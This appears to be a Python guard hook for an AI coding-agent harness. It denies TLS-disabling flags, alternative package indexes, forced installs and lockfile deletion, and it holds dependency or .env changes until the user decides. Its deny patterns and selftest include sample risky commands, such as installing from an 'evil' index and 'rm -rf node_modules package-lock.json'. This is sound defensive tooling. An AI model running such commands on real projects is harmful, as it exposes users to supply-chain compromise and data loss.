"""Mistral Vibe hook: blocks what the harness prompt forbids but the model still does.

One script for every hook type (see ../hooks.toml); Vibe sends the event as JSON
on stdin. A pre_tool denial becomes the tool error the model sees.

- Always blocked: dependency/TLS escape hatches, deleting lockfiles or node_modules.
- Needs the user: changing a dependency, editing .env*, a manifest's versions or a
  lockfile. Blocked inside the agent's turn; once the agent has stopped and the user
  answered (post_agent), the same action goes through.
- Loop budget per turn: an identical failing command twice, 2 failed installs,
  8 failed commands, then only reporting is left.

    python guard.py --selftest
"""

import json
import os
import re
import sys
import tempfile
from pathlib import Path

STATE_DIR = Path(tempfile.gettempdir()) / "vibe-harness"
MAX_SAME_FAILURE = 2
MAX_FAILED_INSTALLS = 2
MAX_FAILED_COMMANDS = 8  # ponytail: one cap per turn, not per problem; split by problem if it bites

ESCAPES = [
    (r"--force(?![-\w])", "--force"),
    (r"--legacy-peer-deps", "--legacy-peer-deps"),
    (r"--break-system-packages", "--break-system-packages"),
    (r"--extra-index-url|--index-url|(^|\s)-i\s+https?://", "a different package index"),
    (r"--trusted-host|--no-verify|NODE_TLS_REJECT_UNAUTHORIZED|strict-ssl\W+false|sslverify\W+false|--insecure",
     "disabling TLS verification"),
    (r"\b(rm|del|rmdir|rd|Remove-Item)\b[^|;&]*(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|poetry\.lock|uv\.lock|node_modules)",
     "deleting a lockfile or node_modules"),
]
INSTALL = re.compile(
    r"\b(npm|pnpm|yarn)\s+(i|install|ci|add|up|upgrade|update)\b|\bpip3?\s+install\b"
    r"|\buv\s+(add|sync|pip\s+install|lock)\b|\bpoetry\s+(add|install|update|lock)\b", re.I)
PKG_CMD = re.compile(r"\b(npm|pnpm|yarn)\s+(i|install|add|up|upgrade|update|remove|uninstall|rm)\b(.*)"
                     r"|\bpip3?\s+install\b(.*)", re.I)
DEP_CHANGE = re.compile(r"\bpip3?\s+uninstall\b|\buv\s+(add|remove)\b|\bpoetry\s+(add|remove|update)\b", re.I)
PIP_FILE_FLAGS = {"-r", "--requirement", "-e", "--editable", "-c", "--constraint"}


def changes_dependency(cmd):
    """True for commands that pick a package or a version, not a plain install of the manifest."""
    if DEP_CHANGE.search(cmd):
        return True
    for segment in re.split(r"&&|\|\||;|\|", cmd):
        m = PKG_CMD.search(segment)
        if not m:
            continue
        tokens, skip = (m.group(3) if m.group(1) else m.group(4)).split(), False
        for tok in tokens:
            if skip:
                skip = False
            elif tok in PIP_FILE_FLAGS:
                skip = True
            elif not tok.startswith("-") and tok != "." and not tok.startswith(("2>", ">")):
                return True
    return False
ENV_FILE = re.compile(r"^\.env(\..+)?$")
ENV_TEMPLATE = re.compile(r"\.(example|sample|template|dist)$")
LOCKFILES = {"package-lock.json", "yarn.lock", "pnpm-lock.yaml", "poetry.lock", "uv.lock", "pipfile.lock"}
VERSION_SPEC = re.compile(r"""["']?[\w@/.-]+["']?\s*(:|==|>=|<=|~=|!=|=)\s*["']?[\^~<>=]*\d+\.\d+""")

ASK = " Stop here: explain the situation to the user and ask what to do. Do not look for another way around it."


def blocked(why):
    return {"decision": "deny", "reason": f"BLOCKED by harness: {why}.{ASK}"}


def normalize(cmd):
    cmd = re.sub(r"^\s*(cd\s+\S+\s*(&&|;)\s*)+", "", cmd)  # same command from another cwd is the same command
    return " ".join(cmd.split())


def load(session_id):
    try:
        return json.loads((STATE_DIR / f"{session_id}.json").read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {"failures": {}, "failed_installs": 0, "failed_commands": 0, "pending": [], "approved": []}


def save(session_id, state):
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    (STATE_DIR / f"{session_id}.json").write_text(json.dumps(state), encoding="utf-8")


def needs_user(state, key, why):
    """Deny until the user has had a turn since the first attempt."""
    if key in state["approved"]:
        return None
    if key not in state["pending"]:
        state["pending"].append(key)
    return blocked(f"{why} needs the user's decision")


def pre_bash(state, cmd):
    for pattern, label in ESCAPES:
        if re.search(pattern, cmd, re.I):
            return blocked(f"{label} is never allowed")
    norm = normalize(cmd)
    if state["failed_commands"] >= MAX_FAILED_COMMANDS:
        return blocked(f"{state['failed_commands']} commands failed in this turn, the loop budget is spent. "
                       "Report the exact errors, what you tried and your diagnosis")
    if state["failures"].get(norm, 0) >= MAX_SAME_FAILURE:
        return blocked("this exact command already failed twice; running it again changes nothing")
    if INSTALL.search(cmd) and state["failed_installs"] >= MAX_FAILED_INSTALLS:
        return blocked(f"{state['failed_installs']} install attempts failed, the dependency budget is spent. "
                       "Report the exact error and your diagnosis")
    if changes_dependency(cmd):
        return needs_user(state, "bash:" + norm, "adding, removing or changing a dependency version")
    return None


def pre_file(state, tool, args):
    path = args.get("file_path") or args.get("path") or ""
    name = Path(path).name.lower()
    key = f"file:{os.path.normcase(os.path.abspath(path))}"
    if ENV_FILE.match(name) and not ENV_TEMPLATE.search(name):
        return needs_user(state, key, f"editing {name} (secrets and local config are the user's)")
    if name in LOCKFILES:
        return needs_user(state, key, f"editing the lockfile {name}")
    if re.match(r"requirements.*\.txt$", name):
        return needs_user(state, key, f"changing dependencies in {name}")
    if name in ("package.json", "pyproject.toml"):
        text = args.get("content", "") if tool == "write_file" else args.get("old_string", "") + "\n" + args.get("new_string", "")
        if tool == "write_file" or VERSION_SPEC.search(text):
            return needs_user(state, key, f"changing dependency versions in {name}")
    return None


def post_bash(state, event):
    out = event.get("tool_output") or {}
    code = out.get("returncode", out.get("exit_code", 0))
    if event.get("tool_status") == "success" and not code:
        return
    cmd = event["tool_input"].get("command", "")
    norm = normalize(cmd)
    state["failures"][norm] = state["failures"].get(norm, 0) + 1
    state["failed_commands"] += 1
    if INSTALL.search(cmd):
        state["failed_installs"] += 1


def handle(event):
    sid = event.get("session_id") or "default"
    state = load(sid)
    kind = event.get("hook_event_name")
    tool = event.get("tool_name", "").rsplit(".", 1)[-1]  # unified harness: "file_system.bash"
    if tool in ("git_bash", "powershell"):  # native Windows shells
        tool = "bash"
    result = None
    if kind == "pre_tool" and tool == "bash":
        result = pre_bash(state, event["tool_input"].get("command", ""))
    elif kind == "pre_tool" and tool in ("edit", "search_replace", "write_file"):
        result = pre_file(state, tool, event["tool_input"])
    elif kind == "post_tool" and tool == "bash":
        post_bash(state, event)
    elif kind == "post_agent":  # the user gets the floor: new budget, pending decisions were seen
        state.update(failures={}, failed_installs=0, failed_commands=0,
                     approved=state["approved"] + state["pending"], pending=[])
    save(sid, state)
    return result


def selftest():
    global STATE_DIR
    STATE_DIR = Path(tempfile.mkdtemp())

    def pre(cmd):
        return handle({"session_id": "t", "hook_event_name": "pre_tool", "tool_name": "bash",
                       "tool_input": {"command": cmd}})

    def fail(cmd):
        handle({"session_id": "t", "hook_event_name": "post_tool", "tool_name": "bash",
                "tool_input": {"command": cmd}, "tool_status": "success", "tool_output": {"returncode": 1}})

    def edit(path, old="", new=""):
        return handle({"session_id": "t", "hook_event_name": "pre_tool", "tool_name": "file_system.search_replace",
                       "tool_input": {"file_path": path, "old_string": old, "new_string": new}})

    for cmd in ("npm install --legacy-peer-deps", "pip install x --trusted-host pypi.org",
                "rm -rf node_modules package-lock.json", "git push --force", "pip install -i https://evil/simple x",
                "Remove-Item -Recurse node_modules"):
        assert pre(cmd), cmd
    for cmd in ("npm install", "npm ci", "pip install -r requirements.txt", "pip install -e .",
                "git push --force-with-lease", "pip install --force-reinstall -r requirements.txt", "npm test"):
        assert not pre(cmd), cmd
    for cmd in ("npm install react@19", "npm i -D vitest", "pip install pydantic==2.14.1", "uv add httpx"):
        assert pre(cmd), cmd
    fail("cd /a && npm install")
    assert not pre("npm install")
    fail("cd /b && npm install")
    assert "already failed twice" in pre("npm install")["reason"]
    assert "dependency budget" in pre("npm ci")["reason"]
    assert not pre("python -m pytest")
    assert edit(".env", "", "API_KEY=x") and not edit(".env.example", "", "API_KEY=")
    assert edit("package.json", '"react": "18.3.1"', '"react": "19.0.0"')
    assert not edit("package.json", '"test": "node test.js"', '"test": "vitest"')
    assert edit("requirements-dev.txt") and edit("yarn.lock")
    handle({"session_id": "t", "hook_event_name": "post_agent"})
    assert not pre("npm install"), "budget resets once the user had a turn"
    assert not pre("npm install react@19") and not edit(".env", "", "API_KEY=x"), "asked, then allowed"
    assert pre("npm install react@18"), "only what was asked about is allowed"
    assert pre("npm install --force"), "escapes stay blocked"
    print("selftest OK")


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    else:
        decision = handle(json.load(sys.stdin))
        if decision:
            print(json.dumps(decision))
